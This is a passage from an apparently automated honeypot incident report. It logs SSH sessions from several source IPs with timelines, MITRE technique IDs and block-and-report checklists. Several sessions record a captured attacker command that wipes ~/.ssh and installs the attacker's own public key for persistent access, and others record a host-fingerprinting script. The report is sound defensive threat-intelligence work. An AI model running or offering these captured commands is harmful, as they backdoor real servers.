| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 16:32:01` | `cowrie.session.connect` |
| `2026-09-05 16:32:01` | `cowrie.client.version` |
| `2026-09-05 16:32:01` | `cowrie.client.kex` |
| `2026-09-05 16:32:01` | `cowrie.login.success` |
| `2026-09-05 16:32:02` | `cowrie.session.params` |
| `2026-09-05 16:32:02` | `cowrie.command.input` |
| `2026-09-05 16:32:02` | `cowrie.command.failed` |
| `2026-09-05 16:32:02` | `cowrie.log.closed` |
| `2026-09-05 16:32:03` | `cowrie.session.params` |
| `2026-09-05 16:32:03` | `cowrie.command.input` |
| `2026-09-05 16:32:03` | `cowrie.session.file_download` |
| `2026-09-05 16:32:03` | `cowrie.log.closed` |
| `2026-09-05 16:32:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `156.235.89[.]172` to AbuseIPDB if not already reported
- [ ] Block `156.235.89[.]172` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5e935de9107c

| Field | Detail |
|---|---|
| **Source IP** | `156.235.89[.]172` |
| **First Seen** | 2026-09-05 16:32 |
| **Last Seen** | 2026-09-05 16:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 16:32:03` | `cowrie.session.connect` |
| `2026-09-05 16:32:03` | `cowrie.client.version` |
| `2026-09-05 16:32:03` | `cowrie.client.kex` |
| `2026-09-05 16:32:03` | `cowrie.login.success` |
| `2026-09-05 16:32:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `156.235.89[.]172` to AbuseIPDB if not already reported
- [ ] Block `156.235.89[.]172` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0a659e13e4c4

| Field | Detail |
|---|---|
| **Source IP** | `156.235.89[.]172` |
| **First Seen** | 2026-09-05 16:32 |
| **Last Seen** | 2026-09-05 16:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 16:32:04` | `cowrie.session.connect` |
| `2026-09-05 16:32:04` | `cowrie.client.version` |
| `2026-09-05 16:32:04` | `cowrie.client.kex` |
| `2026-09-05 16:32:04` | `cowrie.login.success` |
| `2026-09-05 16:32:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `156.235.89[.]172` to AbuseIPDB if not already reported
- [ ] Block `156.235.89[.]172` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-79b6721a90cc

| Field | Detail |
|---|---|
| **Source IP** | `222.71.205[.]34` |
| **First Seen** | 2026-09-05 16:32 |
| **Last Seen** | 2026-09-05 16:36 |
| **Session Duration** | 234s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 16:32:37` | `cowrie.session.connect` |
| `2026-09-05 16:32:37` | `cowrie.client.version` |
| `2026-09-05 16:32:37` | `cowrie.client.kex` |
| `2026-09-05 16:32:38` | `cowrie.login.success` |
| `2026-09-05 16:32:39` | `cowrie.session.params` |
| `2026-09-05 16:32:39` | `cowrie.command.input` |
| `2026-09-05 16:32:39` | `cowrie.command.failed` |
| `2026-09-05 16:32:40` | `cowrie.log.closed` |
| `2026-09-05 16:32:41` | `cowrie.session.params` |
| `2026-09-05 16:32:41` | `cowrie.command.input` |
| `2026-09-05 16:36:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.71.205[.]34` to AbuseIPDB if not already reported
- [ ] Block `222.71.205[.]34` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-470c6bb54d29

| Field | Detail |
|---|---|
| **Source IP** | `222.71.205[.]34` |
| **First Seen** | 2026-09-05 16:32 |
| **Last Seen** | 2026-09-05 16:32 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 16:32:41` | `cowrie.session.connect` |
| `2026-09-05 16:32:41` | `cowrie.client.version` |
| `2026-09-05 16:32:41` | `cowrie.client.kex` |
| `2026-09-05 16:32:43` | `cowrie.login.success` |
| `2026-09-05 16:32:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.71.205[.]34` to AbuseIPDB if not already reported
- [ ] Block `222.71.205[.]34` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0455cae48058

| Field | Detail |
|---|---|
| **Source IP** | `222.71.205[.]34` |
| **First Seen** | 2026-09-05 16:32 |
| **Last Seen** | 2026-09-05 16:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 16:32:44` | `cowrie.session.connect` |
| `2026-09-05 16:32:44` | `cowrie.client.version` |
| `2026-09-05 16:32:44` | `cowrie.client.kex` |
| `2026-09-05 16:32:45` | `cowrie.login.success` |
| `2026-09-05 16:32:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.71.205[.]34` to AbuseIPDB if not already reported
- [ ] Block `222.71.205[.]34` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef21d4a9d1da

| Field | Detail |
|---|---|
| **Source IP** | `152.32.150[.]26` |
| **First Seen** | 2026-09-05 16:33 |
| **Last Seen** | 2026-09-05 16:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 16:33:16` | `cowrie.session.connect` |
| `2026-09-05 16:33:16` | `cowrie.client.version` |
| `2026-09-05 16:33:16` | `cowrie.client.kex` |
| `2026-09-05 16:33:16` | `cowrie.login.success` |
| `2026-09-05 16:33:17` | `cowrie.session.params` |
| `2026-09-05 16:33:17` | `cowrie.command.input` |
| `2026-09-05 16:33:17` | `cowrie.command.failed` |
| `2026-09-05 16:33:17` | `cowrie.log.closed` |
| `2026-09-05 16:33:18` | `cowrie.session.params` |
| `2026-09-05 16:33:18` | `cowrie.command.input` |
| `2026-09-05 16:33:18` | `cowrie.session.file_download` |
| `2026-09-05 16:33:18` | `cowrie.log.closed` |
| `2026-09-05 16:33:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.150[.]26` to AbuseIPDB if not already reported
- [ ] Block `152.32.150[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5797378ef7e4

| Field | Detail |
|---|---|
| **Source IP** | `152.32.150[.]26` |
| **First Seen** | 2026-09-05 16:33 |
| **Last Seen** | 2026-09-05 16:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 16:33:18` | `cowrie.session.connect` |
| `2026-09-05 16:33:18` | `cowrie.client.version` |
| `2026-09-05 16:33:18` | `cowrie.client.kex` |
| `2026-09-05 16:33:18` | `cowrie.login.success` |
| `2026-09-05 16:33:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.150[.]26` to AbuseIPDB if not already reported
- [ ] Block `152.32.150[.]26` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-23ab4d5512be

| Field | Detail |
|---|---|
| **Source IP** | `152.32.150[.]26` |
| **First Seen** | 2026-09-05 16:33 |
| **Last Seen** | 2026-09-05 16:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 16:33:18` | `cowrie.session.connect` |
| `2026-09-05 16:33:18` | `cowrie.client.version` |
| `2026-09-05 16:33:18` | `cowrie.client.kex` |
| `2026-09-05 16:33:18` | `cowrie.login.success` |
| `2026-09-05 16:33:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.150[.]26` to AbuseIPDB if not already reported
- [ ] Block `152.32.150[.]26` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-16906e20a141

| Field | Detail |
|---|---|
| **Source IP** | `45.177.147[.]146` |
| **First Seen** | 2026-09-05 16:34 |
| **Last Seen** | 2026-09-05 16:34 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 16:34:04` | `cowrie.session.connect` |
| `2026-09-05 16:34:04` | `cowrie.client.version` |
| `2026-09-05 16:34:04` | `cowrie.client.kex` |
| `2026-09-05 16:34:05` | `cowrie.login.success` |
| `2026-09-05 16:34:06` | `cowrie.session.params` |
| `2026-09-05 16:34:06` | `cowrie.command.input` |
| `2026-09-05 16:34:06` | `cowrie.command.failed` |
| `2026-09-05 16:34:06` | `cowrie.log.closed` |
| `2026-09-05 16:34:07` | `cowrie.session.params` |
| `2026-09-05 16:34:07` | `cowrie.command.input` |
| `2026-09-05 16:34:07` | `cowrie.session.file_download` |
| `2026-09-05 16:34:07` | `cowrie.log.closed` |
| `2026-09-05 16:34:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.177.147[.]146` to AbuseIPDB if not already reported
- [ ] Block `45.177.147[.]146` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-34c0fa8a6325

| Field | Detail |
|---|---|
| **Source IP** | `45.177.147[.]146` |
| **First Seen** | 2026-09-05 16:34 |
| **Last Seen** | 2026-09-05 16:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 16:34:07` | `cowrie.session.connect` |
| `2026-09-05 16:34:07` | `cowrie.client.version` |
| `2026-09-05 16:34:08` | `cowrie.client.kex` |
| `2026-09-05 16:34:08` | `cowrie.login.success` |
| `2026-09-05 16:34:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.177.147[.]146` to AbuseIPDB if not already reported
- [ ] Block `45.177.147[.]146` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a0b0365b1e4

| Field | Detail |
|---|---|
| **Source IP** | `45.177.147[.]146` |
| **First Seen** | 2026-09-05 16:34 |
| **Last Seen** | 2026-09-05 16:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 16:34:09` | `cowrie.session.connect` |
| `2026-09-05 16:34:09` | `cowrie.client.version` |
| `2026-09-05 16:34:09` | `cowrie.client.kex` |
| `2026-09-05 16:34:09` | `cowrie.login.success` |
| `2026-09-05 16:34:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.177.147[.]146` to AbuseIPDB if not already reported
- [ ] Block `45.177.147[.]146` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-09850417742f

| Field | Detail |
|---|---|
| **Source IP** | `77.90.185[.]17` |
| **First Seen** | 2026-09-05 16:38 |
| **Last Seen** | 2026-09-05 16:38 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 16:38:35` | `cowrie.session.connect` |
| `2026-09-05 16:38:35` | `cowrie.client.version` |
| `2026-09-05 16:38:35` | `cowrie.client.kex` |
| `2026-09-05 16:38:36` | `cowrie.login.success` |
| `2026-09-05 16:38:38` | `cowrie.direct-tcpip.request` |
| `2026-09-05 16:38:38` | `cowrie.direct-tcpip.ja4` |
| `2026-09-05 16:38:38` | `cowrie.direct-tcpip.data` |
| `2026-09-05 16:38:39` | `cowrie.direct-tcpip.request` |
| `2026-09-05 16:38:40` | `cowrie.direct-tcpip.ja4` |
| `2026-09-05 16:38:40` | `cowrie.direct-tcpip.data` |
| `2026-09-05 16:38:40` | `cowrie.direct-tcpip.request` |
| `2026-09-05 16:38:42` | `cowrie.direct-tcpip.ja4` |
| `2026-09-05 16:38:42` | `cowrie.direct-tcpip.data` |
| `2026-09-05 16:38:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.90.185[.]17` to AbuseIPDB if not already reported
- [ ] Block `77.90.185[.]17` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f4c64193d3fc

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-09-05 16:43 |
| **Last Seen** | 2026-09-05 16:44 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 16:43:53` | `cowrie.session.connect` |
| `2026-09-05 16:43:54` | `cowrie.client.version` |
| `2026-09-05 16:43:54` | `cowrie.client.kex` |
| `2026-09-05 16:43:58` | `cowrie.login.success` |
| `2026-09-05 16:44:00` | `cowrie.session.params` |
| `2026-09-05 16:44:00` | `cowrie.command.input` |
| `2026-09-05 16:44:00` | `cowrie.command.input` |
| `2026-09-05 16:44:00` | `cowrie.command.input` |
| `2026-09-05 16:44:00` | `cowrie.command.input` |
| `2026-09-05 16:44:00` | `cowrie.command.input` |
| `2026-09-05 16:44:00` | `cowrie.command.success` |
| `2026-09-05 16:44:00` | `cowrie.command.input` |
| `2026-09-05 16:44:00` | `cowrie.command.input` |
| `2026-09-05 16:44:00` | `cowrie.command.input` |
| `2026-09-05 16:44:00` | `cowrie.command.input` |
| `2026-09-05 16:44:01` | `cowrie.log.closed` |
| `2026-09-05 16:44:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b5c729d9c7b0

| Field | Detail |
|---|---|
| **Source IP** | `77.90.185[.]17` |
| **First Seen** | 2026-09-05 16:45 |
| **Last Seen** | 2026-09-05 16:46 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 16:45:56` | `cowrie.session.connect` |
| `2026-09-05 16:45:56` | `cowrie.client.version` |
| `2026-09-05 16:45:56` | `cowrie.client.kex` |
| `2026-09-05 16:45:56` | `cowrie.login.success` |
| `2026-09-05 16:45:59` | `cowrie.direct-tcpip.request` |
| `2026-09-05 16:46:00` | `cowrie.direct-tcpip.ja4` |
| `2026-09-05 16:46:00` | `cowrie.direct-tcpip.data` |
| `2026-09-05 16:46:01` | `cowrie.direct-tcpip.request` |
| `2026-09-05 16:46:01` | `cowrie.direct-tcpip.ja4` |
| `2026-09-05 16:46:01` | `cowrie.direct-tcpip.data` |
| `2026-09-05 16:46:03` | `cowrie.direct-tcpip.request` |
| `2026-09-05 16:46:04` | `cowrie.direct-tcpip.ja4` |
| `2026-09-05 16:46:04` | `cowrie.direct-tcpip.data` |
| `2026-09-05 16:46:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.90.185[.]17` to AbuseIPDB if not already reported
- [ ] Block `77.90.185[.]17` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-938eabde360a

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-09-05 16:47 |
| **Last Seen** | 2026-09-05 16:47 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 16:47:06` | `cowrie.session.connect` |
| `2026-09-05 16:47:06` | `cowrie.client.version` |
| `2026-09-05 16:47:06` | `cowrie.client.kex` |
| `2026-09-05 16:47:14` | `cowrie.login.success` |
| `2026-09-05 16:47:17` | `cowrie.session.params` |
| `2026-09-05 16:47:17` | `cowrie.command.input` |
| `2026-09-05 16:47:17` | `cowrie.command.input` |
| `2026-09-05 16:47:17` | `cowrie.command.input` |
| `2026-09-05 16:47:17` | `cowrie.command.input` |
| `2026-09-05 16:47:17` | `cowrie.command.input` |
| `2026-09-05 16:47:17` | `cowrie.command.success` |
| `2026-09-05 16:47:17` | `cowrie.command.input` |
| `2026-09-05 16:47:17` | `cowrie.command.input` |
| `2026-09-05 16:47:17` | `cowrie.command.input` |
| `2026-09-05 16:47:17` | `cowrie.command.input` |
| `2026-09-05 16:47:18` | `cowrie.log.closed` |
| `2026-09-05 16:47:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-68b150245c3a

| Field | Detail |
|---|---|
| **Source IP** | `107.180.88[.]176` |
| **First Seen** | 2026-09-05 16:47 |
| **Last Seen** | 2026-09-05 16:47 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 16:47:32` | `cowrie.session.connect` |
| `2026-09-05 16:47:32` | `cowrie.client.version` |
| `2026-09-05 16:47:32` | `cowrie.client.kex` |
| `2026-09-05 16:47:32` | `cowrie.login.success` |
| `2026-09-05 16:47:33` | `cowrie.session.params` |
| `2026-09-05 16:47:33` | `cowrie.command.input` |
| `2026-09-05 16:47:33` | `cowrie.command.failed` |
| `2026-09-05 16:47:33` | `cowrie.log.closed` |
| `2026-09-05 16:47:34` | `cowrie.session.params` |
| `2026-09-05 16:47:34` | `cowrie.command.input` |
| `2026-09-05 16:47:34` | `cowrie.session.file_download` |
| `2026-09-05 16:47:34` | `cowrie.log.closed` |
| `2026-09-05 16:47:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.180.88[.]176` to AbuseIPDB if not already reported
- [ ] Block `107.180.88[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-28c327ccf94b

| Field | Detail |
|---|---|
| **Source IP** | `107.180.88[.]176` |
| **First Seen** | 2026-09-05 16:47 |
| **Last Seen** | 2026-09-05 16:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 16:47:34` | `cowrie.session.connect` |
| `2026-09-05 16:47:34` | `cowrie.client.version` |
| `2026-09-05 16:47:34` | `cowrie.client.kex` |
| `2026-09-05 16:47:34` | `cowrie.login.success` |
| `2026-09-05 16:47:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.180.88[.]176` to AbuseIPDB if not already reported
- [ ] Block `107.180.88[.]176` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-14d4318dae44

| Field | Detail |
|---|---|
| **Source IP** | `107.180.88[.]176` |
| **First Seen** | 2026-09-05 16:47 |
| **Last Seen** | 2026-09-05 16:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 16:47:34` | `cowrie.session.connect` |
| `2026-09-05 16:47:34` | `cowrie.client.version` |
| `2026-09-05 16:47:34` | `cowrie.client.kex` |
| `2026-09-05 16:47:35` | `cowrie.login.success` |
| `2026-09-05 16:47:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.180.88[.]176` to AbuseIPDB if not already reported
- [ ] Block `107.180.88[.]176` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5943a91b277e

| Field | Detail |
|---|---|
| **Source IP** | `165.154.255[.]63` |
| **First Seen** | 2026-09-05 16:50 |
| **Last Seen** | 2026-09-05 16:50 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
